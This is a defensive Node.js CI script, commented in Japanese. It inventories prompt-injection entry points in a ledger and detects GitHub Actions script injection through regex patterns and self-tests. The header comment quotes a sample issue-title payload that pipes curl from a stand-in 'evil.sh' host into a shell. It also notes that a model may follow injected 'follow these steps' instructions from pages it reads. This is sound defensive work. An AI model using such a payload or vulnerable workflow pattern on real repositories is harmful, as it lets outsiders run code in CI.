#!/usr/bin/env node
/**
 * Prompt Injection / Tool Poisoning の面を検査する。
 *
 *   node scripts/check-injection-surface.mjs           # 表示
 *   node scripts/check-injection-surface.mjs --check   # CI
 *
 * 【「気をつける」では成立しない】
 * 対策は、**どこから外部コンテンツが入るかを数え上げる**ところからしか始まらない。
 * 台帳（data/injection-surface.json）に入口と緩和策と**残る危険**を書き、
 * ここでは機械で確かめられる部分だけを確かめる。
 *
 * 【機械で確かめられる部分】
 * GitHub Actions の script injection。`${{ github.event.* }}` を `run:` の中に
 * 展開すると、**第三者が書いた文字列がそのままシェルとして実行される。**
 * Issue のタイトルに `"; curl evil.sh | sh; #` と書くだけで通る、あの形。
 * これは正規表現で検出できるので検出する。
 *
 * 【機械で確かめられない部分】
 * セッションの判断そのものの汚染。「この手順に従え」と書かれたページを読んで
 * 従わない保証は、モデルの側にしか無い。**台帳の residual_risk に書いて、
 * 消えていないことを消えていないと言い続ける。**
 */

import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { ledgerScenarios, run } from './lib/selftest.mjs';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
export const SURFACE_PATH = path.join(ROOT, 'data/injection-surface.json');
const WORKFLOW_DIR = path.join(ROOT, '.github/workflows');

export const TRUST = ['none', 'partial', 'own'];

/**
 * run: / github-script の script: に直接展開すると危ない式。**第三者が中身を書ける場所。**
 *
 * 【2026-11-10 監査】以前は `${{` の直後に来る6種だけを run: の中で見ていた。
 * workflow_run の head_branch（フォークの PR が決められる）や inputs、
 * format() で包んだ式、github-script の script: は素通りしていた。いまはブロックの
 * `${{ … }}` の中身だけを取り出して照合する（地の文の "inputs." は拾わない）。
 *
 * 【同日の再レビュー】同じ値を別の書き方で展開する形も拾う:
 *   - 第三者が書ける**オブジェクトを丸ごと**渡す形（`toJSON(github.event.pull_request)`、
 *     `toJSON(github.event.workflow_run)`、`toJSON(inputs)` など）。プロパティを続けずに
 *     その名前を書いた時点で、中のどの欄でも展開される
 *   - 角括弧の参照（`github['head_ref']`、`inputs['dry_run']`）—— normalizeExpr が
 *     `.` の形へ直してから照合する
 *   - `${{ env.X }}`。env: で渡しても、`${{ env.X }}` と書けば値がスクリプトへ展開される。
 *     安全なのはシェルの `"$X"` と github-script の `process.env.X` だけ
 *   - 行をまたいで書いた `${{ … }}`（ブロック全体をつないでから照合する）
 *   - 大文字小文字の違い（GitHub の式は文脈名・プロパティ名の大文字小文字を区別しない）
 */
export const UNTRUSTED_EXPR = [
  /\bgithub\.event\.issue\.(title|body)\b/i,
  /\bgithub\.event\.comment\.body\b/i,
  /\bgithub\.event\.pull_request\.(title|body)\b/i,
  /\bgithub\.event\.review\.body\b/i,
  /\bgithub\.head_ref\b/i,
  /\bgithub\.event\.discussion\./i,
  /\bgithub\.event\.workflow_run\.(head_branch|head_commit|display_title|head_repository|pull_requests)\b/i,
  /\bgithub\.event\.pull_request\.head\.(ref|label|repo)\b/i,
  /\bgithub\.event\.(head_commit|commits|pages)\b/i,
  /\bgithub\.ref_name\b/i,
  /\bgithub\.event\.(inputs|client_payload)\b/i,
  // The whole object (toJSON(), join(), format(), an index) carries every field above.
  /(?<![\w.])github(\.event(\.(issue|pull_request(\.head)?|comment|review|discussion|workflow_run))?)?(?![\w-]|\.\w)/i,
  /(?<![\w.])inputs(?![\w-])/i,
  /(?<![\w.])env(?![\w-])/i,
];

/**
 * 照合の前に式を整える。`x['y']` を `x.y` に直し、残った文字列リテラルを空にし
 * （`'inputs.'` のような地の文を拾わない）、`.` の前後の空白を詰める。
 */
export function normalizeExpr(s) {
  return s
    .replace(/\[\s*'((?:[^']|'')*)'\s*\]/g, (_, k) => `.${k.replace(/''/g, "'")}`)
    .replace(/'(?:[^']|'')*'/g, "''")
    .replace(/\s*\.\s*/g, '.');
}

/**
 * ワークフローの `run:` と github-script の `script:` のブロックだけを取り出す。
 * env: 経由で渡し、シェル変数・process.env として読むのは安全（展開されない）ので、
 * **ブロックの中に直接書かれている場合だけを問題にする。**
 *
 * ブロックの終わりは、キー（`run` / `script`）自身の桁より深くない行。`- run: …` と
 * 書いたステップでは、同じステップの env: / if: / with: が `run` と同じ桁に並ぶので、
 * そこでブロックが終わる（ダッシュの桁で測ると、env: に移した値まで run: の中身として
 * 読んでいた）。
 */
export function scanWorkflow(text, file) {
  const hits = [];
  const lines = text.split('\n');
  let block = null; // { indent, rows: [[lineNo, text], …] }
  const flush = () => { if (block) checkBlock(block.rows); block = null; };
  lines.forEach((line, i) => {
    if (block) {
      if (line.trim() === '') { block.rows.push([i + 1, '']); return; }
      if (line.search(/\S/) > block.indent) { block.rows.push([i + 1, line]); return; }
      flush(); // the block ended; this line may start the next one
    }
    const m = /^(\s*)(-?\s*)(run|script):\s*(\|[-+]?|>[-+]?)?\s*(.*)$/.exec(line);
    if (m) block = { indent: m[1].length + m[2].length, rows: [[i + 1, m[5] ?? '']] };
  });
  flush();
  function checkBlock(rows) {
    const joined = rows.map(([, s]) => s).join('\n');
    for (const mm of joined.matchAll(/\$\{\{([\s\S]*?)\}\}/g)) {
      const inner = normalizeExpr(mm[1]);
      const re = UNTRUSTED_EXPR.find((r) => r.test(inner));
      if (!re) continue;
      const [ln, s] = rows[joined.slice(0, mm.index).split('\n').length - 1];
      hits.push({ file, line: ln, expr: String(re), text: s.trim().slice(0, 90) });
    }
  }
  return hits;
}

/** scanWorkflow 自身の自己テスト。**拾うべきものを拾い、拾わないものを拾わない。** */
export const SCAN_SELFTEST = [
  ['run: の workflow_run.head_branch を拾う', 1,
    'jobs:\n  a:\n    steps:\n      - run: echo "${{ github.event.workflow_run.head_branch }}"\n'],
  ['github-script の script: の pull_request.head.ref を拾う', 1,
    'jobs:\n  a:\n    steps:\n      - uses: actions/github-script@x\n        with:\n          script: |\n            const b = "${{ github.event.pull_request.head.ref }}";\n'],
  ['format() で包んだ issue.title を拾う', 1,
    'jobs:\n  a:\n    steps:\n      - run: |\n          echo "${{ format(\'{0}\', github.event.issue.title) }}"\n'],
  ['run: の inputs.x を拾う', 1,
    'jobs:\n  a:\n    steps:\n      - run: |\n          [ "${{ inputs.dry_run }}" = true ]\n'],
  ['続けて書いた2つ目のブロックも読む', 1,
    'jobs:\n  a:\n    steps:\n      - run: |\n          echo ok\n      - run: echo "${{ github.head_ref }}"\n'],
  ['env: 経由は拾わない', 0,
    'jobs:\n  a:\n    steps:\n      - env:\n          B: ${{ github.event.workflow_run.head_branch }}\n        run: echo "$B"\n'],
  ['`- run:` の後ろの env: は拾わない', 0,
    'jobs:\n  a:\n    steps:\n      - run: echo "$B"\n        env:\n          B: ${{ github.event.workflow_run.head_branch }}\n'],
  ['`- run:` の後ろの if: は拾わない', 0,
    'jobs:\n  a:\n    steps:\n      - run: x\n        if: ${{ inputs.go }}\n'],
  ['`- run: |` の中は、後ろに env: があっても拾う', 1,
    'jobs:\n  a:\n    steps:\n      - run: |\n          echo "${{ github.ref_name }}"\n        env:\n          A: 1\n'],
  ['地の文の "inputs." は拾わない', 0,
    'jobs:\n  a:\n    steps:\n      - uses: actions/github-script@x\n        with:\n          script: |\n            core.notice("This PR changes waiting-progress inputs. The waiting");\n'],
  ['toJSON() でイベントの部分オブジェクトを丸ごと渡す形を拾う', 1,
    'jobs:\n  a:\n    steps:\n      - run: echo \'${{ toJSON(github.event.pull_request) }}\' | jq .\n'],
  ['toJSON(github.event.pull_request.head) を拾う', 1,
    'jobs:\n  a:\n    steps:\n      - run: echo \'${{ toJSON(github.event.pull_request.head) }}\'\n'],
  ['toJSON(inputs) を拾う', 1,
    'jobs:\n  a:\n    steps:\n      - run: echo \'${{ toJSON(inputs) }}\'\n'],
  ['角括弧の参照 github[\'head_ref\'] を拾う', 1,
    'jobs:\n  a:\n    steps:\n      - run: echo "${{ github[\'head_ref\'] }}"\n'],
  ['角括弧の参照 github.event[\'issue\'][\'title\'] を拾う', 1,
    'jobs:\n  a:\n    steps:\n      - run: echo "${{ github.event[ \'issue\' ][\'title\'] }}"\n'],
  ['env: で渡しても ${{ env.X }} と書けば拾う', 1,
    'jobs:\n  a:\n    steps:\n      - env:\n          B: ${{ github.event.workflow_run.head_branch }}\n        run: git checkout "${{ env.B }}"\n'],
  ['行をまたいだ ${{ … }} を拾う', 1,
    'jobs:\n  a:\n    steps:\n      - run: |\n          echo "${{\n            github.event.issue.title }}"\n'],
  ['大文字で書いた GITHUB.HEAD_REF を拾う', 1,
    'jobs:\n  a:\n    steps:\n      - run: echo "${{ GITHUB.HEAD_REF }}"\n'],
  ['第三者が書けない欄（番号・ID）は拾わない', 0,
    'jobs:\n  a:\n    steps:\n      - run: |\n          echo "${{ github.event.pull_request.number }} ${{ github.event.workflow_run.id }}"\n'],
  ['角括弧で書いても、第三者が書けない欄は拾わない', 0,
    'jobs:\n  a:\n    steps:\n      - run: echo "${{ github.event[\'pull_request\'][\'number\'] }}"\n'],
  ['文字列リテラルの中の "env." / "inputs." は拾わない', 0,
    'jobs:\n  a:\n    steps:\n      - run: echo "${{ format(\'env.{0} inputs.\', github.run_id) }}"\n'],
];
export function scanSelftest(log = console.log) {
  let failed = 0;
  for (const [name, want, yml] of SCAN_SELFTEST) {
    const got = scanWorkflow(yml, 'selftest.yml').length;
    const ok = got === want;
    if (!ok) failed++;
    log(`  ${ok ? 'ok  ' : 'FAIL'} ${name}${ok ? '' : `（${got} 件 / 期待 ${want} 件）`}`);
  }
  return failed;
}

export function validate(doc) {
  const problems = [];
  const ids = new Set();
  for (const e of doc.entry_points || []) {
    const at = `entry_points「${e.id || '(id無し)'}」`;
    if (!e.id) problems.push('id の無い入口がある');
    else if (ids.has(e.id)) problems.push(`${at}: id が重複`);
    else ids.add(e.id);
    if (!TRUST.includes(e.trust)) problems.push(`${at}: trust は ${TRUST.join('/')}`);
    if (!e.what) problems.push(`${at}: what が無い`);
    if (!Array.isArray(e.mitigations) || !e.mitigations.length) {
      problems.push(`${at}: mitigations が空 — 緩和策の無い入口は、入口として認識していないのと同じ`);
    }
    // **残る危険を空にできない。**「対策済み」と書けるようにすると、必ずそう書く。
    if (!e.residual_risk) {
      problems.push(`${at}: residual_risk が無い`
        + ' — **「対策済み」と書けるようにすると必ずそう書く。**消えていないものは消えていないと書く');
    }
  }
  if ((doc.entry_points || []).length < 3) problems.push('入口が3つ未満 — 数え上げが足りていない');
  return problems;
}


// ── 自己テスト（**落ちることを確かめる**） ──────────────────────
// 通ることだけ確かめる自己テストは、検査が何も見ていなくても緑になる。
// 壊し方は実データを複製して作る（固定フィクスチャだと台帳と形がずれても気づけない）。
const SELFTEST_BREAKAGES = [
  ['**緩和策の空の入口**は落ちる（入口として認識していないのと同じ）', (d) => { d.entry_points[0].mitigations = []; }],
  ['残存リスクの記載が無ければ落ちる', (d) => { delete d.entry_points[0].residual_risk; }],
  ['知らない trust は落ちる', (d) => { d.entry_points[0].trust = 'たぶん安全'; }],
  ['id の重複は落ちる', (d) => { d.entry_points.push({ ...d.entry_points[0] }); }],
];
const SCENARIOS = ledgerScenarios(
  () => JSON.parse(fs.readFileSync(SURFACE_PATH, 'utf8')),
  (d) => validate(d),
  SELFTEST_BREAKAGES,
);

const isMain = process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url);
if (isMain) {
  if (process.argv.includes('--selftest')) process.exit(run(SCENARIOS) === 0 && scanSelftest() === 0 ? 0 : 1);
  const doc = JSON.parse(fs.readFileSync(SURFACE_PATH, 'utf8'));
  const problems = validate(doc);

  const files = fs.existsSync(WORKFLOW_DIR)
    ? fs.readdirSync(WORKFLOW_DIR).filter((f) => f.endsWith('.yml') || f.endsWith('.yaml')) : [];
  const hits = files.flatMap((f) => scanWorkflow(fs.readFileSync(path.join(WORKFLOW_DIR, f), 'utf8'), f));

  console.log(`注入面 — 外部コンテンツの入口 ${doc.entry_points.length}件\n`);
  for (const e of doc.entry_points) {
    console.log(`  [${e.trust.padEnd(7)}] ${e.what}`);
    for (const m of e.mitigations) console.log(`      ✓ ${m}`);
    console.log(`      **残る危険:** ${e.residual_risk}`);
  }
  console.log(`\n  ワークフローの script injection 検査: ${files.length} ファイル`);
  if (hits.length) {
    for (const h of hits) console.log(`    ${h.file}:${h.line}  ${h.text}`);
    problems.push(`run: / script: に第三者が書ける式を直接展開している ${hits.length}件`
      + ' — **env: 経由で渡し、シェルでは "$X"、github-script では process.env.X で読むこと**'
      + '（`${{ env.X }}` と書くと、env: で渡しても値が展開される）');
  } else {
    console.log('    run: / script: に第三者が書ける式の直接展開なし。');
  }
  console.log('\n  **機械で確かめられるのはここまで。**セッションの判断そのものの汚染');
  console.log('  （「この手順に従え」と書かれたページを読んで従わない保証）は、');
  console.log('  モデルの側にしか無い。台帳の residual_risk に書いてある。');

  if (problems.length) {
    console.error('\n注入面: 問題');
    for (const p of problems) console.error(`  - ${p}`);
    process.exit(1);
  }
  if (process.argv.includes('--check')) {
    if (run(SCENARIOS) !== 0) process.exit(1);
    if (scanSelftest(() => {}) !== 0) { scanSelftest(); process.exit(1); }
    console.log('\n入口の棚卸しと、機械で見える範囲に問題なし。');
  }
}
